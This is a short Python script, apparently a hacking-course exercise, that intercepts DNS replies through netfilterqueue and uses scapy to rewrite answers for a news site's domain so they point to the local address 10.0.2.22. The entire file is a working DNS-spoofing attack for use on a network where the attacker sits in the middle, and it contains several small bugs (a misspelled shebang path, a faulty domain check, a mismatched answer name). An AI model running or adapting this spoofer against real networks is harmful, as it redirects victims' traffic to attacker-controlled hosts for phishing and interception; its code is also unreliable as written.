#!/use/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if ("panet.co.il" or "www.panet.co.il") in qname :
            print("[+] spoofing target  ")
            #print(scapy_packet.show())
            answer = scapy.DNSRR(rrname="www.google.com", rdata="10.0.2.22")
            scapy_packet[scapy.DNS].an = answer # modify the respone
            scapy_packet[scapy.DNS].ancount = 1 #modfiy the answer count to 1 not more

            del scapy_packet[scapy.IP].chksum # deleting the packet vlaue and scapy refilling auto in the IP section
            del scapy_packet[scapy.IP].len # removing the length of the packet in IP section
            del scapy_packet[scapy.UDP].chksum # deleting the packet vlaue and scapy refilling auto in the UDP section
            del scapy_packet[scapy.UDP].len # removing the length of the packet in UDP section

            packet.set_payload(str(scapy_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()